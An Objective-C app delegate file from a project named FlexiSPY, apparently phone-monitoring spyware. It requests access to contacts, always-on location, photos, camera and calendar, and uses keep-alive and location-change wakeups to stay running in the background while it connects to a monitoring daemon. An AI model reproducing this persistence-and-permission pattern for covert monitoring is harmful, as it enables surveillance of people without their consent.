//
//  MobileSPYAppDelegate.m
//  FlexiSPY
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright __MyCompanyName__ 2011. All rights reserved.
//

#import "MobileSPYAppDelegate.h"
#import "RootViewController.h"

#import "AppUIConnection.h"
#import "LicenseInfo.h"
#import "ConfigurationManagerImpl.h"
#import "PhoneInfoImp.h"
#import "AppEngine.h"
#import "DefStd.h"
#import "DateTimeFormat.h"

#import <AddressBook/AddressBook.h>
#import <CoreLocation/CoreLocation.h>
#import <AssetsLibrary/AssetsLibrary.h>
#import <AVFoundation/AVFoundation.h>
#import <EventKit/EventKit.h>

@interface MobileSPYAppDelegate (private)
- (void) requestUserPrivacy;
- (void) postSignificantLocationChangeNotification: (NSString *) aText;
@end

@implementation MobileSPYAppDelegate

@synthesize window;
@synthesize navigationController;

@synthesize mAppUIConnection;
@synthesize mLicenseInfo;
@synthesize mConfigurationManager;
@synthesize mPhoneInfo;
@synthesize mAppEngine;
@synthesize mLocationManager;

@synthesize mShowActivateWizard;

#pragma mark -
#pragma mark Application lifecycle

- (void)applicationDidFinishLaunching:(UIApplication *)application {
    
}

// If we implement this method; applicationDidFinishLaunching: will never be called
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    
    mAppEngineBG = [application beginBackgroundTaskWithExpirationHandler:^(void) {
        DLog(@"AppEngine background task expired");
        [application endBackgroundTask:mAppEngineBG];
        mAppEngineBG = UIBackgroundTaskInvalid;
    }];
    
    [application setKeepAliveTimeout:600 handler:^(void){
        //DLog(@"Keep alive handler");
        
//            UILocalNotification* local = [[[UILocalNotification alloc] init] autorelease];
//            local.fireDate = [NSDate dateWithTimeIntervalSinceNow:30];
//            local.alertBody = [NSString stringWithFormat:@"Keep Alive at %@", [DateTimeFormat phoenixDateTime]];
//            local.soundName = UILocalNotificationDefaultSoundName;
//            local.applicationIconBadgeNumber = 0;
//            [[UIApplication sharedApplication] scheduleLocalNotification:local];
        
        __block UIBackgroundTaskIdentifier keepAliveBG = [application beginBackgroundTaskWithExpirationHandler:^(void) {
            //DLog(@"Keep alive background task expired");
            [application endBackgroundTask:keepAliveBG];
            keepAliveBG = UIBackgroundTaskInvalid;
        }];
        
        [self postSignificantLocationChangeNotification:@"Keep alive background"];
    }];

//    #warning For testing purpose
//    UIUserNotificationSettings* userNotificationSettings = [UIUserNotificationSettings settingsForTypes:(UIUserNotificationTypeBadge | UIUserNotificationTypeSound | UIUserNotificationTypeAlert) categories:nil];
//    [application registerUserNotificationSettings:userNotificationSettings];
    [application setApplicationIconBadgeNumber:0];
    
	DLog (@"launchOptions = %@", launchOptions);
    
    // Override point for customization after app launch
    [window setRootViewController:navigationController];
    [window makeKeyAndVisible];
    
    self.mShowActivateWizard = YES;
    [self requestUserPrivacy];
    
    mAppEngine = [[AppEngine alloc] init];
    mAppEngine.mAppEngineDelegate = self;
    
    // Connection to daemon
    mAppUIConnection = [[AppUIConnection alloc] init];
    mConfigurationManager = [[ConfigurationManagerImpl alloc] init];
    mPhoneInfo = [[PhoneInfoImp alloc] init];
    
    [self performSelector:@selector(postSignificantLocationChangeNotification:) withObject:@"Launch Options" afterDelay:2.5];
    
	return YES;
}

- (void)applicationWillTerminate:(UIApplication *)application {
	// Save data if appropriate
}

- (void)applicationDidEnterBackground:(UIApplication *)application {
	
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
	
}

- (void)application:(UIApplication *)application didReceiveLocalNotification:(UILocalNotification *)notification {
    DLog(@"Local notification, %@", notification);
    [application setApplicationIconBadgeNumber:0];
}

#pragma mark - Delegate methods -
#pragma mark CLLocationManagerDelegate

- (void)locationManager:(CLLocationManager *)manager
     didUpdateLocations:(NSArray<CLLocation *> *)locations {
    DLog(@"Location significant changes, locations: %@", locations);
    UIApplication *application = [UIApplication sharedApplication];
    __block UIBackgroundTaskIdentifier locationBG = [application beginBackgroundTaskWithExpirationHandler:^(void) {
        DLog(@"Significant location changes background task expired");
        [application endBackgroundTask:locationBG];
        locationBG = UIBackgroundTaskInvalid;
    }];
    
    [self postSignificantLocationChangeNotification:@"Location Manager"];
    
    [manager startMonitoringSignificantLocationChanges];
}

- (void)locationManager:(CLLocationManager *)manager
       didFailWithError:(NSError *)error {
    DLog(@"Location significant changes, error: %@", error);
}

#pragma mark AppEngineDelegate

- (void) engineConstructCompleted {
    UIApplication *application = [UIApplication sharedApplication];
    [application endBackgroundTask:mAppEngineBG];
    mAppEngineBG = UIBackgroundTaskInvalid;
}

#pragma mark - Private methods -

- (void) requestUserPrivacy {
    DLog(@"Ask user to access privacy");
    // Address book
    ABAddressBookRef dummy = ABAddressBookCreate();
    ABAddressBookRequestAccessWithCompletion(dummy, ^(bool granted, CFErrorRef error) {
        DLog(@"Is user granted permission to access address book : %d", granted);
        CFRelease(dummy);
    });
    
    // Location
    CLLocationManager *locationManager = [[CLLocationManager alloc] init];
    [locationManager requestAlwaysAuthorization];
    [locationManager startMonitoringSignificantLocationChanges];
    locationManager.delegate = self;
    self.mLocationManager = locationManager;
    [locationManager release];
    
    // Photo/Video
    ALAssetsLibrary *lib = [[ALAssetsLibrary alloc] init];
    [lib enumerateGroupsWithTypes:ALAssetsGroupSavedPhotos usingBlock:^(ALAssetsGroup *group, BOOL *stop) {
        DLog(@"numberOfAssets: %li",(long)[group numberOfAssets]);
    } failureBlock:^(NSError *error) {
        if (error.code == ALAssetsLibraryAccessUserDeniedError) {
            DLog(@"User denied access, code: %li",(long)error.code);
        }else{
            DLog(@"Other error code: %li",(long)error.code);
        }
    }];
    [lib autorelease];
    
    // Camera
    if ([AVCaptureDevice respondsToSelector:@selector(requestAccessForMediaType: completionHandler:)]) {
        [AVCaptureDevice requestAccessForMediaType:AVMediaTypeVideo completionHandler:^(BOOL granted) {
            // Will get here on both iOS 7 & 8 even though camera permissions weren't required
            // until iOS 8. So for iOS 7 permission will always be granted.
            if (granted) {
                // Permission has been granted. Use dispatch_async for any UI updating
                // code because this block may be executed in a thread.
                dispatch_async(dispatch_get_main_queue(), ^{
                    ;
                });
            } else {
                // Permission has been denied.
            }
        }];
    } else {
        // We are on iOS <= 6. Just do what we need to do.
    }
    
    // Calendar
    EKEventStore *eventStore = [[EKEventStore alloc] init];
    [eventStore requestAccessToEntityType:EKEntityTypeEvent completion:^(BOOL granted, NSError * _Nullable error) {
        DLog(@"User granted calendar entry permission: %i", granted);
    }];
    [eventStore requestAccessToEntityType:EKEntityTypeReminder completion:^(BOOL granted, NSError * _Nullable error) {
        DLog(@"User granted calendar reminder permission: %i", granted);
    }];
    [eventStore autorelease];
}

- (void) postSignificantLocationChangeNotification: (NSString *) aText {
    DLog(@"Trigger location changes, %@", aText);
    NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
    [nc postNotificationName:kSignificantLocationChangesNotification object:nil];
    
    // For testing purpose
//    UILocalNotification* local = [[[UILocalNotification alloc] init] autorelease];
//    local.fireDate = [NSDate dateWithTimeIntervalSinceNow:30];
//    local.alertBody = [NSString stringWithFormat:@"%@ at %@", aText, [DateTimeFormat phoenixDateTime]];
//    local.soundName = UILocalNotificationDefaultSoundName;
//    local.applicationIconBadgeNumber = 0;
//    [[UIApplication sharedApplication] scheduleLocalNotification:local];
}

#pragma mark -
#pragma mark Memory management

- (void)dealloc {
    [mLocationManager release];
    [mAppEngine release];
	[mPhoneInfo release];
	[mConfigurationManager release];
	[mLicenseInfo release];
	[mAppUIConnection release];
	[navigationController release];
	[window release];
	[super dealloc];
}

@end

